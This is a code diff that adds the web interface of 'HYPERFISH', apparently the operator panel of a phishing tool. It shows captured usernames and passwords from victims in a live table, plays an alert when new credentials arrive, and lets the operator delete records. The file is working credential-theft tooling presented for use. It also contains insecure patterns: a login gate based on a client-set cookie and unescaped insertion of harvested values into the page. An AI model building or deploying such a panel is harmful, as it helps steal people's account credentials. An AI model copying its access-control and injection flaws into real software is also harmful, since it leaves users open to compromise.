@@ -1,0 +1,194 @@
+<html>
+    <title>HYPERFISH Web UI</title>
+    <head>
+            <link rel='stylesheet' media='screen and (min-width: 701px) and (max-width: 999999999px)' href='regular.css' />
+            <link rel='stylesheet' media='screen and (min-width: 424px) and (max-width: 701px)' href='medium.css' />
+            <link rel='stylesheet' media='screen and (min-width: 0px) and (max-width: 424px)' href='small.css' />
+            <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css'/>
+            <meta name="viewport" content="width=device-width, initial-scale=1" />
+            <script src="/socket.io/socket.io.js"></script>
+            <script src="https://code.jquery.com/jquery-1.11.1.js"></script>
+            <audio src="notification.mp3" id="notification" autostart="false"></audio>
+    </head>
+    <body>
+ 
+           <div id="main-content-div">
+               
+<center>
+    <a id="settings" class="fa fa-cog fa-3x settings-gear hide" onclick="toggleSettings()" aria-hidden="true"></a>
+<div class="hyperfish-img">
+</div>
+</center>
+<a id="logout" class="fa fa-sign-out logout fa-3x hide" aria-hidden="true" onclick="logout()"></a>
+
+                <table id="table" class="hide">
+                        <tr>
+                          <th>From</th>
+                          <th>Username</th>
+                          <th>Password</th>
+                          <th></th>
+                        </tr>
+                        
+                      </table>
+                      <div id="loginPanel" class="loginpanel">
+                          <center><h1>Log In</h1></center>
+                          <center><h2 class="error" id="error">Error</h2></center>
+                        <input id="webUser-password" class="webuser-password" type="password" placeholder="Password"></input>
+                        <input id="webUser-password-submit" class="webuser-password-submit" type="submit" value="submit" onclick="checkLogin()"></input>
+                        <a class="change-password" onclick="changePassword()">Change Password</a>
+                      </div>
+                      <div id="changePasswordPanel" class="changePasswordPanel hide" >
+                            <center><h1>Change Password</h1></center>
+                            <center><h2 class="error" id="error">Error</h2></center>
+                            <input id="old-webUser-password" class="webuser-password" type="password" placeholder="Old Password"></input>
+                          <input id="new-webUser-password" class="new-webuser-password" type="password" placeholder="New Password"></input>
+                          <input id="webUser-change-password-submit" class="webuser-password-submit" type="submit" value="submit" onclick="checkChangePassword()"></input>
+                          <a class="change-password" onclick="cancelChangePassword()">Cancel</a>
+                        </div>
+        </div>
+
+    </body>
+</html>
+
+<script>
+
+var socket = io();
+var loggedIn = "false"
+var table = `           <tr>
+                          <th>From</th>
+                          <th>Username</th>
+                          <th>Password</th>
+                          <th></th>
+                        </tr>`
+
+$( window ).load(function() {
+    loggedInCookie = getCookie('loggedIn')
+
+    if(loggedInCookie == 'True'){
+    $("#settings").removeClass("hide");
+    $("#logout").removeClass("hide");
+    $("#table").removeClass("hide");
+    $("#loginPanel").addClass("hide");
+    socket.emit('queryCredentials')
+    }else{
+    $("#logout").addClass("hide");
+    $("#table").addClass("hide");
+    $("#loginPanel").removeClass("hide");
+    }
+
+});
+
+socket.on('queriedCredentials', function(from, email, password, id){
+    document.getElementById('table').innerHTML += "<tr><td>" + from + "</td><td>" + email + "</td><td>" + password + "</td><td><div class='remove' onclick='remove(\"" + id + "\")'></div></td></tr>"
+})
+socket.on('newData', function(){
+    newData()  
+})
+function toggleSettings(){
+    $("#table").addClass("hide");
+    $("#settings").removeClass("fa-cog");
+    $("#settings").addClass("fa-times");
+    $('#settings').attr("onclick", 'untoggleSettings()')
+}
+function untoggleSettings(){
+    $("#table").removeClass("hide");
+    $("#settings").addClass("fa-cog");
+    $("#settings").removeClass("fa-times");
+    $('#settings').attr("onclick", 'toggleSettings()')
+}
+function changePassword(){
+    $("#error").addClass("show");
+    $("#changePasswordPanel").removeClass("hide");
+    $("#loginPanel").addClass("hide");
+}
+function cancelChangePassword(){
+    $("#error").addClass("show");
+    $("#changePasswordPanel").addClass("hide");
+    $("#loginPanel").removeClass("hide");
+}
+function newData(){
+    var loggedInCookie = getCookie(loggedIn)
+    if (loggedInCookie == "True"){
+    document.getElementById("table").innerHTML = table
+    socket.emit('queryCredentials')
+    notify()
+    }else{
+        console.log("notLoggedIn")
+    }
+}
+function remove(id){
+    console.log(id)
+    socket.emit('deleteCredential', id)
+    newData()
+}
+function login(){
+    setCookie('loggedIn','True')
+     $("#settings").removeClass("hide");
+     $("#logout").removeClass("hide");
+    $("#table").removeClass("hide");
+    $("#loginPanel").addClass("hide");
+    socket.emit('queryCredentials')
+}
+function logout(){
+    document.getElementById("table").innerHTML = table
+    setCookie('loggedIn','False')
+     $("#logout").addClass("hide");
+    $("#table").addClass("hide");
+    $("#loginPanel").removeClass("hide");
+    socket.emit('logout')
+}
+function notify () {
+    var thissound = document.getElementById('notification');
+    thissound.play();
+  }
+function checkLogin(){
+    var password = document.getElementById('webUser-password').value
+    socket.emit('checkLogin',password)
+}
+function checkChangePassword(){
+    var oldPassword = document.getElementById('old-webUser-password').value
+    var newPassword = document.getElementById('new-webUser-password').value
+    socket.emit('checkChangePassword', oldPassword, newPassword)
+}
+socket.on('Error', function(){
+    console.log("error")
+    $("#error").addClass("show");
+})
+socket.on('loginTrue',function(){
+    $("#error").removeClass("show");
+    login()
+})
+  $("#webUser-password").keyup(function(event) {
+		if (event.keyCode == 13) {
+			$("#webUser-password-submit").click();
+			
+		}
+	});
+    $("#new-webUser-password").keyup(function(event) {
+		if (event.keyCode == 13) {
+            $("#webUser-change-password-submit").click();
+			
+		}
+	});
+    function setCookie(cname, cvalue, exdays) {
+    var d = new Date();
+    d.setTime(d.getTime() + (exdays*24*60*60*1000));
+    var expires = "expires="+ d.toUTCString();
+    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+}
+function getCookie(cname) {
+    var name = cname + "=";
+    var decodedCookie = decodeURIComponent(document.cookie);
+    var ca = decodedCookie.split(';');
+    for(var i = 0; i <ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0) == ' ') {
+            c = c.substring(1);
+        }
+        if (c.indexOf(name) == 0) {
+            return c.substring(name.length, c.length);
+        }
+    }
+    return "";
+}
+</script>
